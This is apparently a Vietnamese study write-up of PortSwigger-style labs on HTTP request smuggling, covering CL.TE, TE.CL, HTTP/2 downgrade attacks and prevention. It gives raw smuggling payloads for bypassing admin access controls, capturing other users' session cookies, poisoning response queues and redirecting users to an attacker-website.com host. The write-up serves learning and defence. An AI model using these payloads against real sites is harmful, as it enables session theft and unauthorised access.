# **HTTP request smuggling**

## **HTTP request smuggling là gì?**

- HTTP request smuggling là một kỹ thuật can thiệp vào cách một trang web xử lý các chuỗi yêu cầu HTTP nhận được từ một hoặc nhiều người dùng. Các lỗ hổng HTTP request smuggling về bản chất thường rất nghiêm trọng, cho phép kẻ tấn công vượt qua các biện pháp kiểm soát bảo mật, giành quyền truy cập trái phép vào dữ liệu nhạy cảm và trực tiếp xâm phạm những người dùng ứng dụng khác.

- **HTTP request smuggling phát sinh như thế nào**:

  - Đặc điểm kĩ thuật HTTP có 2 cách khác nhau để kết thúc request:
    - Header `Content-Length`: nó chỉ định độ dài của nội dung thư tính bằng byte
    - Header `Transfer-Encoding`: Giá trị "chunked" của trường Transfer-Encoding chỉ ra rằng dữ liệu đang được truyền dưới dạng các khối (chunks) có kích thước động.

      - Khi sử dụng mã hóa "chunked", dữ liệu được chia thành các khối nhỏ và gửi theo từng khối. Mỗi khối được gửi đi kèm với thông tin về kích thước của khối đó. Quá trình này cho phép truyền dữ liệu mà không cần xác định kích thước tổng thể của nó trước khi bắt đầu truyền.

        ```
        POST /search HTTP/1.1
        Host: normal-website.com
        Content-Type: application/x-www-form-urlencoded
        Transfer-Encoding: chunked

        b
        q=smuggling
        0
        ```

## **Cách thực hiện tấn công HTTP request smuggling**

- CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
- TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
- TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

### **`CL.TE vulnerabilities`**

- Tại đây, front-end sử dụng tiêu đề Content-Length và back-end sử dụng tiêu đề Transfer-Encoding. Chúng ta có thể thực hiện một cuộc tấn công HTTP request smuggling đơn giản như sau:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Tại đây front-end đã xác định được Content-Length : 13.
- Phía back-end xác định bằng Transfer-Encoding và do đó coi nội dung thư là sử dụng mã hóa khối. Nó xử lý đoạn đầu tiên, được cho là có độ dài bằng 0 và do đó được coi là kết thúc yêu cầu. Các byte sau, SMUGGLED, không được xử lý và máy chủ phụ trợ sẽ coi các byte này là phần bắt đầu của yêu cầu tiếp theo trong chuỗi.

> `Lab: HTTP request smuggling, basic CL.TE vulnerability`

- Ở lab này phía front-end không hỗ trợ Transfer-Encoding. Từ đấy, nó sẽ tạo ra sự bất đồng với phía back-end bằng tấn công như sau:

![](./img_http_rs/Screenshot%202023-06-24%20144835.png)

### **`TE.CL vulnerabilities`**

- Tại đây, front-end sử dụng tiêu đề Transfer-Encoding và back-end sử dụng tiêu đề Content-Length. Chúng ta có thể thực hiện một cuộc tấn công HTTP request smuggling đơn giản như sau:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

- Chúng ta cần bao gồm chuỗi dấu \r\n\r\n sau số 0 cuối cùng
- Máy chủ front-end tiêu đề Transfer-Encoding và do đó xử lý nội dung thư như sử dụng mã hóa khối. Nó xử lý đoạn đầu tiên, được cho là dài 8 byte, cho đến đầu dòng sau SMUGGLED. Nó xử lý đoạn thứ hai, được cho là có độ dài bằng 0 và do đó được coi là kết thúc yêu cầu. Yêu cầu này được chuyển tiếp đến máy chủ back-end.

- Máy chủ back-end xử lý tiêu đề Content-Length và xác định rằng phần thân yêu cầu dài 3 byte, cho đến đầu dòng tiếp theo 8. Các byte sau, bắt đầu bằng SMUGGLED, không được xử lý và máy chủ back-end sẽ coi đây là phần bắt đầu của yêu cầu tiếp theo trong chuỗi.

> `Lab: HTTP request smuggling, basic TE.CL vulnerability`

- Ở lab này phía front-end hỗ trợ Transfer-Encoding. Từ đấy, nó sẽ tạo ra sự bất đồng với phía back-end bằng tấn công như sau:

![](./img_http_rs/Screenshot%202023-06-25%20234700.png)

### **`TE.TE behavior: obfuscating the TE header`**

- front-end và back-end đều sử dụng tiêu đề Transfer-Encoding. Nhưng một trong các máy chủ có thể không xử lý nó bằng cách làm xáo trộn tiêu đề theo một cách nào đó.

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

> `Lab: HTTP request smuggling, obfuscating the TE header`

![](./img_http_rs/Screenshot%202023-06-26%20101228.png)

## **Cách phát hiện lỗ hổng HTTP request smuggling**

### **`Finding CL.TE or TE.CL vulnerabilities using timing techniques`**

- Nếu một ứng dụng dễ bị biến thể CL.TE của việc request smuggling, thì việc gửi một yêu cầu như sau thường sẽ gây ra sự chậm trễ về thời gian:

```
- CL.TE
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

-----------------------------------------------------------------
- TE.CL
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

- Thử nghiệm dựa trên thời gian cho các lỗ hổng TE.CL sẽ có khả năng làm gián đoạn những người dùng ứng dụng khác nếu ứng dụng dễ bị biến thể CL.TE của lỗ hổng bảo mật. Vì vậy, để ẩn danh và giảm thiểu sự gián đoạn, bạn nên sử dụng thử nghiệm CL.TE trước và chỉ tiếp tục thử nghiệm TE.CL nếu lần thử nghiệm đầu tiên không thành công.

### **`Confirming HTTP request smuggling vulnerabilities using differential responses`**

> `Confirming CL.TE vulnerabilities using differential responses`

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

- Nếu cuộc tấn công thành công, thì hai dòng cuối cùng của yêu cầu này được máy chủ phụ trợ coi là thuộc về yêu cầu tiếp theo được nhận. Điều này sẽ khiến yêu cầu "bình thường" tiếp theo trông như thế này:

```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

> `Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses`

- Như ta đã thấy với một request thường nó sẽ trả về cho chúng ta với mã 200 OK.

![](./img_http_rs/Screenshot%202023-06-26%20104542.png)

- Còn sau đây, là một request tấn công:

![](./img_http_rs/Screenshot%202023-06-26%20104839.png)

> `Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses`

![](./img_http_rs/Screenshot%202023-06-26%20105411.png)

### **`Using HTTP request smuggling to bypass front-end security controls`**

- Một ứng dụng sử dụng front-end để triển khai các hạn chế kiểm soát truy cập, chỉ chuyển tiếp yêu cầu nếu người dùng được phép truy cập URL được yêu cầu. Sau đó, máy chủ back-end sẽ xử lý mọi yêu cầu mà không cần kiểm tra thêm. Trong tình huống này, một lỗ hổng chuyển lậu yêu cầu HTTP có thể được sử dụng để vượt qua kiểm soát truy cập, bằng cách chuyển lậu yêu cầu tới một URL bị hạn chế.

- Giả sử người dùng hiện tại được phép truy cập/home nhưng không được phép truy cập/admin. Họ có thể bỏ qua hạn chế này bằng cách sử dụng cuộc HTTP request smuggling yêu cầu sau:

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

- Máy chủ front-end nhìn thấy hai yêu cầu ở đây, cả hai đều dành cho /home, và do đó, các yêu cầu được chuyển tiếp đến máy chủ back-end. Tuy nhiên, máy chủ back-end nhìn thấy một yêu cầu cho /home và một yêu cầu cho /admin. Nó giả định (như mọi khi) rằng các yêu cầu đã đi qua các điều khiển giao diện người dùng và do đó cấp quyền truy cập vào URL bị hạn chế.

> `Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability`

- Khi tôi thử vào trang web /admin nó đã bị chặn như sau:

![](./img_http_rs/Screenshot%202023-06-26%20150627.png)

- Tôi đã thực hiện bypass access control như sau bằng HTTP request smuggling.

![](./img_http_rs/Screenshot%202023-06-26%20152402.png)

- Và sau đó tôi đã sửa sao cho 2 tiêu đề giống nhau và thực hiện xem trang web dưới quyền admin.

- Mọi người sẽ đặt ra câu hỏi vì sao tôi sử dụng host là local. Vì khi tôi không sử dụng host để tấn công có một thông báo như sau:

![](./img_http_rs/Screenshot%202023-06-26%20154954.png)

- Nên tôi đã thêm host là localhost và tấn công như sau:

![](./img_http_rs/Screenshot%202023-06-26%20155226.png)

> `Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability`

- Tương tự bài trên ta thực hiện tấn công như sau:

![](./img_http_rs/Screenshot%202023-06-26%20154422.png)

### **`Capturing other users' requests`**

- Nếu ứng dụng chứa bất kỳ loại chức năng nào cho phép bạn lưu trữ và sau đó truy xuất dữ liệu văn bản, thì bạn có thể sử dụng chức năng này để nắm bắt nội dung yêu cầu của những người dùng khác. Chúng có thể bao gồm mã thông báo phiên hoặc dữ liệu nhạy cảm khác do người dùng gửi. Các chức năng phù hợp để sử dụng làm phương tiện cho cuộc tấn công này sẽ là nhận xét, email, mô tả hồ sơ, tên hiển thị, v.v.

- Để thực hiện cuộc tấn công, bạn cần gửi lậu một yêu cầu gửi dữ liệu đến chức năng lưu trữ, với tham số chứa dữ liệu để lưu trữ được đặt ở vị trí cuối cùng trong yêu cầu. Ví dụ: giả sử một ứng dụng sử dụng yêu cầu sau để gửi nhận xét về bài đăng trên blog, nhận xét này sẽ được lưu trữ và hiển thị trên blog:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```

- Bây giờ, hãy xem xét điều gì sẽ xảy ra nếu bạn gửi HTTP request smuggling tương đương với tiêu đề Độ dài nội dung quá dài và tham số nhận xét được đặt ở cuối yêu cầu như sau:

```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

- Tiêu đề Độ dài nội dung của yêu cầu nhập lậu cho biết rằng phần thân sẽ dài 400 byte, nhưng chúng tôi chỉ gửi 144 byte. Trong trường hợp này, máy chủ back-end sẽ đợi 256 byte còn lại trước khi đưa ra phản hồi, nếu không sẽ đưa ra thời gian chờ nếu điều này không đến đủ nhanh. Do đó, khi một yêu cầu khác được gửi đến máy chủ back-end trên cùng một kết nối, 256 byte đầu tiên sẽ được thêm một cách hiệu quả vào yêu cầu nhập lậu như sau:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```

> `Lab: Exploiting HTTP request smuggling to capture other users' requests`

- Ở đây chúng ta có chức năng nhận xét bài blog.

![](./img_http_rs/Screenshot%202023-06-26%20175519.png)

- Bằng kĩ thuật tôi đã giải thích ở trên tôi có thể đánh cắp được phiên người dùng khác một cách như sau:

![](./img_http_rs/Screenshot%202023-06-26%20181110.png)

- Khi người dùng khác thực hiện post comment tôi đã có thể đọc được cookie của họ.

![](./img_http_rs/Screenshot%202023-06-26%20181149.png)

### **`Using HTTP request smuggling to exploit reflected XSS`**

> `Lab: Exploiting HTTP request smuggling to deliver reflected XSS`

- Bằng kĩ thuật trên tôi cũng có thể tấn công kèm theo payload XSS.

![](./img_http_rs/Screenshot%202023-06-26%20191743.png)

![](./img_http_rs/Screenshot%202023-06-26%20191824.png)

### **`Using HTTP request smuggling to turn an on-site redirect into an open redirect`**

- Nhiều ứng dụng thực hiện chuyển hướng tại chỗ từ URL này sang URL khác và đặt tên máy chủ từ tiêu đề Máy chủ lưu trữ của yêu cầu vào URL chuyển hướng. Một ví dụ về điều này là hành vi mặc định của máy chủ web Apache và IIS, trong đó yêu cầu thư mục không có dấu gạch chéo ở cuối sẽ nhận được chuyển hướng đến cùng thư mục có dấu gạch chéo ở cuối:

```
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

- Hành vi này thường được coi là vô hại, nhưng nó có thể bị khai thác trong một cuộc tấn công HTTP request smuggling để chuyển hướng người dùng khác đến miền bên ngoài. Ví dụ:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

- Smuggled request sẽ kích hoạt chuyển hướng đến trang web của kẻ tấn công, điều này sẽ ảnh hưởng đến yêu cầu của người dùng tiếp theo được máy chủ phụ trợ xử lý. Ví dụ:

```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

## **`HTTP/2 request smuggling`**

### **HTTP/2 message length**

- request smuggling về cơ bản là khai thác sự khác biệt giữa cách các máy chủ khác nhau diễn giải độ dài của yêu cầu. HTTP/2 giới thiệu một cơ chế duy nhất, mạnh mẽ để thực hiện điều này, cơ chế này từ lâu đã được cho là giúp nó vốn dĩ miễn nhiễm với yêu cầu buôn lậu.

- Mặc dù bạn sẽ không thấy điều này trong Burp, nhưng các thông báo HTTP/2 được gửi qua dây dưới dạng một loạt các "khung" riêng biệt. Trước mỗi khung hình là một trường độ dài rõ ràng, trường này cho máy chủ biết chính xác có bao nhiêu byte cần đọc. Do đó, độ dài của yêu cầu là tổng độ dài khung hình của nó.

- Về lý thuyết, cơ chế này có nghĩa là kẻ tấn công không có cơ hội đưa ra sự mơ hồ cần thiết để request smuggling, miễn là trang web sử dụng HTTP/2 từ đầu đến cuối. Tuy nhiên, trong thực tế, điều này thường không xảy ra do thực tiễn hạ cấp HTTP/2 phổ biến nhưng nguy hiểm.

### **`HTTP/2 downgrading`**

- HTTP/2 downgrading là quá trình viết lại các yêu cầu HTTP/2 bằng cách sử dụng cú pháp HTTP/1 để tạo ra một yêu cầu HTTP/1 tương đương. Các máy chủ web và proxy đảo ngược thường làm điều này để cung cấp hỗ trợ HTTP/2 cho các máy khách trong khi giao tiếp với các máy chủ back-end chỉ nói HTTP/1. Thực tiễn này là điều kiện tiên quyết cho nhiều cuộc tấn công được đề cập trong phần này.

![](./img_http_rs/Screenshot%202023-06-27%20000340.png)

- Khi back-end nói HTTP/1 đưa ra phản hồi, máy chủ front-end sẽ đảo ngược quá trình này để tạo phản hồi HTTP/2 mà nó trả về cho máy khách.

- Điều này hoạt động vì mỗi phiên bản của giao thức về cơ bản chỉ là một cách khác nhau để biểu diễn cùng một thông tin. Mỗi mục trong thông báo HTTP/1 có giá trị tương đương gần đúng trong HTTP/2.

![](./img_http_rs/Screenshot%202023-06-27%20000634.png)

### **`H2.CL vulnerabilities`**

- Các yêu cầu HTTP/2 không cần phải chỉ định rõ ràng độ dài của chúng trong tiêu đề. Trong quá trình hạ cấp, điều này có nghĩa là các máy chủ front-end thường thêm tiêu đề Độ dài nội dung HTTP/1, lấy giá trị của nó bằng cách sử dụng cơ chế độ dài tích hợp của HTTP/2. Thật thú vị, các yêu cầu HTTP/2 cũng có thể bao gồm tiêu đề độ dài nội dung của riêng chúng. Trong trường hợp này, một số máy chủ front-end sẽ chỉ sử dụng lại giá trị này trong kết quả yêu cầu HTTP/1.

- Thông số kỹ thuật quy định rằng mọi tiêu đề có độ dài nội dung trong yêu cầu HTTP/2 phải khớp với độ dài được tính bằng cơ chế tích hợp, nhưng điều này không phải lúc nào cũng được xác thực đúng cách trước khi hạ cấp. Do đó, có thể chuyển lậu các yêu cầu bằng cách đưa vào tiêu đề độ dài nội dung gây hiểu lầm. Mặc dù giao diện người dùng sẽ sử dụng độ dài HTTP/2 ngầm định để xác định vị trí kết thúc yêu cầu, nhưng giao diện người dùng HTTP/1 phải tham chiếu đến tiêu đề Độ dài nội dung bắt nguồn từ tiêu đề được chèn của bạn, dẫn đến việc không đồng bộ hóa.

![](./img_http_rs/Screenshot%202023-06-27%20084417.png)

> `Lab: H2.CL request smuggling`

- Ở lab này tôi đã thực hiện tấn công request smuggling sau khi tắt update Content-Length. Tôi quan sát phàn hồi và biết rằng phía front-end đã thực hiện chuyển tiếp request.

![](./img_http_rs/Screenshot%202023-06-27%20090059.png)

- Tôi đã tạo một trang web vs một payload độc hại và đợi người dùng truy cập vào trang web tôi sẽ lấy được cookie của người dùng.

![](./img_http_rs/Screenshot%202023-06-27%20094158.png)
![](./img_http_rs/Screenshot%202023-06-27%20090950.png)

### **`H2.TE vulnerabilities`**

- Chunked transfer encoding không tương thích với HTTP/2 và thông số kỹ thuật khuyến nghị rằng bất kỳ tiêu đề transfer-encoding: chunked nào mà bạn cố gắng đưa vào đều phải bị loại bỏ hoặc yêu cầu bị chặn hoàn toàn. Nếu máy chủ front-end không thực hiện được điều này và sau đó hạ cấp yêu cầu đối với một HTTP/1 back-end hỗ trợ mã hóa khối, điều này cũng có thể kích hoạt các cuộc tấn công buôn lậu yêu cầu.

![](./img_http_rs/Screenshot%202023-06-27%20095311.png)

### **`Response queue poisoning`**

- Response queue poisoning là một hình thức tấn công request smuggling mạnh mẽ khiến máy chủ giao diện người dùng bắt đầu ánh xạ các phản hồi từ back-end đến các yêu cầu sai. Trong thực tế, điều này có nghĩa là tất cả người dùng của cùng một kết nối front-end/back-end đều được phân phối liên tục các phản hồi dành cho người khác.

- Điều này đạt được bằng cách gửi lậu một yêu cầu hoàn chỉnh, do đó gợi ra hai phản hồi từ back-end khi máy chủ front-end chỉ mong đợi một phản hồi.

- `Desynchronizing the response queue: (Không đồng bộ hóa hàng đợi phản hồi)`
  - Khi bạn gửi request smuggling hoàn chỉnh, máy chủ front-end vẫn cho rằng nó chỉ chuyển tiếp một yêu cầu duy nhất. Mặt khác, back-end nhìn thấy hai yêu cầu riêng biệt và sẽ gửi hai phản hồi tương ứng:

  ![](./img_http_rs/Screenshot%202023-06-27%20103811.png)

  - Giao diện người dùng ánh xạ chính xác phản hồi đầu tiên tới yêu cầu "trình bao bọc" ban đầu và chuyển tiếp yêu cầu này tới máy khách. Vì không có thêm yêu cầu nào đang chờ phản hồi, nên phản hồi thứ hai không mong muốn được giữ trong hàng đợi trên kết nối giữa giao diện người dùng và giao diện người dùng.

  - Khi front-end nhận được một yêu cầu khác, nó sẽ chuyển tiếp yêu cầu này đến back-end như bình thường. Tuy nhiên, khi đưa ra phản hồi, nó sẽ gửi phản hồi đầu tiên trong hàng đợi, tức là phản hồi còn sót lại cho yêu cầu đã nhập lậu.

  - Sau đó, phản hồi chính xác từ back-end sẽ không có yêu cầu phù hợp. Chu kỳ này được lặp lại mỗi khi một yêu cầu mới được chuyển tiếp xuống cùng một kết nối tới back-end.

- `Stealing other users' responses (Ăn cắp phản hồi của người dùng khác)`

![](./img_http_rs/Screenshot%202023-06-27%20110218.png)

- Họ không kiểm soát được phản hồi nào họ nhận được vì họ sẽ luôn được gửi phản hồi tiếp theo trong hàng đợi, tức là phản hồi cho yêu cầu của người dùng trước đó. Trong một số trường hợp, điều này sẽ được quan tâm hạn chế. Tuy nhiên, bằng cách sử dụng các công cụ như Burp Intruder, kẻ tấn công có thể dễ dàng tự động hóa quá trình phát hành lại yêu cầu. Bằng cách đó, họ có thể nhanh chóng lấy được nhiều loại phản hồi dành cho những người dùng khác nhau, ít nhất một số trong số đó có khả năng chứa dữ liệu hữu ích.

- Kẻ tấn công có thể tiếp tục đánh cắp các phản hồi như thế này miễn là kết nối front-end/back-end vẫn mở. Thời điểm đóng kết nối chính xác khác nhau giữa các máy chủ, nhưng một mặc định phổ biến là chấm dứt kết nối sau khi nó đã xử lý 100 yêu cầu. Việc đầu độc lại một kết nối mới sau khi kết nối hiện tại bị đóng cũng là chuyện nhỏ.

> `Lab: Response queue poisoning via H2.TE request smuggling`

- Ở bài này mục tiêu của chúng ta đánh cắp phản hồi của admin và từ đấy sẽ lấy được cookie của admin và xóa tài khoản người dùng.

- Bằng kĩ thuật giải thích ở trên tôi đã thực hiện tấn công bằng H2 request smuggling.

- yêu cầu này chuyển một yêu cầu hoàn chỉnh tới máy chủ back-end. Lưu ý rằng đường dẫn trong cả hai yêu cầu đều trỏ đến một điểm cuối không tồn tại. Điều này có nghĩa là yêu cầu của bạn sẽ luôn nhận được phản hồi 404. Khi bạn đã đầu độc hàng đợi phản hồi, điều này sẽ giúp bạn dễ dàng nhận ra bất kỳ phản hồi nào của người dùng khác mà bạn đã nắm bắt thành công.

![](./img_http_rs/Screenshot%202023-06-27%20123320.png)

![](./img_http_rs/Screenshot%202023-06-27%20123555.png)

### **`Request smuggling via CRLF injection`**

- `Injecting via header names`

![](./img_http_rs/Screenshot%202023-06-27%20130213.png)

- `Supplying an ambiguous host`

- `Supplying an ambiguous path`

![](./img_http_rs/Screenshot%202023-06-27%20130623.png)

- `Injecting a full request line`

![](./img_http_rs/Screenshot%202023-06-27%20130708.png)

- `Injecting a URL prefix`

![](./img_http_rs/Screenshot%202023-06-27%20130747.png)

- `Injecting newlines into pseudo-headers`

![](./img_http_rs/Screenshot%202023-06-27%20130827.png)

### **`Browser-powered request smuggling`**

> `CL.0 request smuggling:`

- Trong ví dụ sau, yêu cầu tiếp theo cho trang chủ đã nhận được phản hồi 404. Điều này cho thấy chắc chắn rằng máy chủ back-end diễn giải phần thân của yêu cầu POST (GET /hopefully404...) là phần bắt đầu của một yêu cầu khác.

![](./img_http_rs/Screenshot%202023-06-27%20180810.png)

![](./img_http_rs/Screenshot%202023-06-27%20181533.png)

## **`Cách phòng chống HTTP request smuggling`**

- Sử dụng HTTP/2 end to end và tắt tính năng hạ cấp HTTP nếu có thể. HTTP/2 sử dụng một cơ chế mạnh mẽ để xác định độ dài của yêu cầu và khi được sử dụng từ đầu đến cuối, vốn đã được bảo vệ chống buôn lậu yêu cầu. Nếu bạn không thể tránh được việc hạ cấp HTTP, hãy đảm bảo rằng bạn xác thực yêu cầu được viết lại theo thông số kỹ thuật HTTP/1.1. Ví dụ: từ chối các yêu cầu chứa dòng mới trong tiêu đề, dấu hai chấm trong tên tiêu đề và khoảng trắng trong phương thức yêu cầu.

- Đừng bao giờ cho rằng các yêu cầu sẽ không có phần thân. Đây là nguyên nhân cơ bản của cả CL.0 và lỗ hổng giải mã phía máy khách.

- Nếu bạn định tuyến lưu lượng truy cập qua proxy chuyển tiếp, hãy đảm bảo rằng HTTP/2 ngược dòng được bật nếu có thể.
